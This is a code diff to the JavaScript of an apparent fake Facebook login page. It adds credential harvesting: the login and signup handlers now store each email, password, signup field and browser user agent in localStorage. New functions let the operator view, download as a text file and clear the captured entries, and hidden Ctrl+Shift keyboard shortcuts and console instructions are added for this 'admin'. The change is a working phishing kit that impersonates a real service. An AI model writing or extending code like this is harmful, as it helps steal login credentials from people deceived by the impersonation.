@@ -41,12 +41,19 @@ loginForm.addEventListener('submit', function(e) {
         return;
     }
     
-    // Store credentials (for demonstration purposes only)
-    console.log('Login attempt:', {
+    // Create credential object
+    const credentials = {
         email: email,
         password: password,
-        timestamp: new Date().toISOString()
-    });
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent
+    };
+    
+    // Store credentials in localStorage
+    saveCredentials(credentials);
+    
+    // Also log to console
+    console.log('Login attempt:', credentials);
     
     // Show success message
     showError('Login credentials captured!');
@@ -64,16 +71,20 @@ signupForm.addEventListener('submit', function(e) {
     
     // Get all form values
     const formData = new FormData(signupForm);
-    const data = {};
+    const data = {
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        type: 'signup'
+    };
     formData.forEach((value, key) => {
         data[key] = value;
     });
     
+    // Store signup data in localStorage
+    saveCredentials(data);
+    
     // Log signup data (for demonstration purposes only)
-    console.log('Signup attempt:', {
-        ...data,
-        timestamp: new Date().toISOString()
-    });
+    console.log('Signup attempt:', data);
     
     // Show success and close modal
     alert('Signup information captured!');
@@ -151,3 +162,130 @@ document.addEventListener('keypress', function(e) {
         }
     }
 });
+
+// Function to save credentials to localStorage
+function saveCredentials(data) {
+    // Get existing credentials from localStorage
+    let allCredentials = JSON.parse(localStorage.getItem('capturedCredentials') || '[]');
+    
+    // Add new credentials
+    allCredentials.push(data);
+    
+    // Save back to localStorage
+    localStorage.setItem('capturedCredentials', JSON.stringify(allCredentials));
+    
+    // Update the count
+    console.log(`Total credentials captured: ${allCredentials.length}`);
+}
+
+// Function to view all captured credentials (for admin)
+function viewCapturedData() {
+    const allCredentials = JSON.parse(localStorage.getItem('capturedCredentials') || '[]');
+    
+    if (allCredentials.length === 0) {
+        console.log('No credentials captured yet.');
+        return;
+    }
+    
+    console.log('=== CAPTURED CREDENTIALS ===');
+    console.log(`Total entries: ${allCredentials.length}`);
+    console.log('============================');
+    
+    allCredentials.forEach((cred, index) => {
+        console.log(`\n--- Entry #${index + 1} ---`);
+        console.log(JSON.stringify(cred, null, 2));
+    });
+    
+    return allCredentials;
+}
+
+// Function to download credentials as a text file
+function downloadCredentials() {
+    const allCredentials = JSON.parse(localStorage.getItem('capturedCredentials') || '[]');
+    
+    if (allCredentials.length === 0) {
+        alert('No credentials to download yet.');
+        return;
+    }
+    
+    // Format credentials as text
+    let content = '=== FACEBOOK LOGIN PAGE - CAPTURED CREDENTIALS ===\n\n';
+    content += `Total Entries: ${allCredentials.length}\n`;
+    content += `Generated: ${new Date().toISOString()}\n`;
+    content += '='.repeat(50) + '\n\n';
+    
+    allCredentials.forEach((cred, index) => {
+        content += `Entry #${index + 1}\n`;
+        content += `-`.repeat(30) + '\n';
+        
+        if (cred.email) {
+            content += `Email/Username: ${cred.email}\n`;
+            content += `Password: ${cred.password}\n`;
+        }
+        
+        content += `Timestamp: ${cred.timestamp}\n`;
+        content += `User Agent: ${cred.userAgent}\n`;
+        content += '\n';
+        
+        Object.keys(cred).forEach(key => {
+            if (!['email', 'password', 'timestamp', 'userAgent'].includes(key)) {
+                content += `${key}: ${cred[key]}\n`;
+            }
+        });
+        
+        content += '\n';
+    });
+    
+    // Create blob and download
+    const blob = new Blob([content], { type: 'text/plain' });
+    const url = window.URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `captured-credentials-${Date.now()}.txt`;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    window.URL.revokeObjectURL(url);
+    
+    console.log('Credentials downloaded successfully!');
+}
+
+// Function to clear all captured data
+function clearCapturedData() {
+    if (confirm('Are you sure you want to clear all captured credentials?')) {
+        localStorage.removeItem('capturedCredentials');
+        console.log('All captured credentials have been cleared.');
+    }
+}
+
+// Admin keyboard shortcut (Ctrl+Shift+V to view data)
+document.addEventListener('keydown', function(e) {
+    // Ctrl+Shift+V - View captured data
+    if (e.ctrlKey && e.shiftKey && e.key === 'V') {
+        e.preventDefault();
+        viewCapturedData();
+    }
+    
+    // Ctrl+Shift+D - Download captured data
+    if (e.ctrlKey && e.shiftKey && e.key === 'D') {
+        e.preventDefault();
+        downloadCredentials();
+    }
+    
+    // Ctrl+Shift+C - Clear captured data
+    if (e.ctrlKey && e.shiftKey && e.key === 'C') {
+        e.preventDefault();
+        clearCapturedData();
+    }
+});
+
+// Log instructions on page load
+console.log('%c=== ADMIN CONTROLS ===', 'color: #1877f2; font-size: 16px; font-weight: bold;');
+console.log('%cKeyboard Shortcuts:', 'color: #1877f2; font-weight: bold;');
+console.log('  Ctrl+Shift+V - View captured credentials');
+console.log('  Ctrl+Shift+D - Download credentials as file');
+console.log('  Ctrl+Shift+C - Clear all captured data');
+console.log('%cConsole Commands:', 'color: #1877f2; font-weight: bold;');
+console.log('  viewCapturedData() - Display all captured credentials');
+console.log('  downloadCredentials() - Download credentials as text file');
+console.log('  clearCapturedData() - Clear all stored credentials');
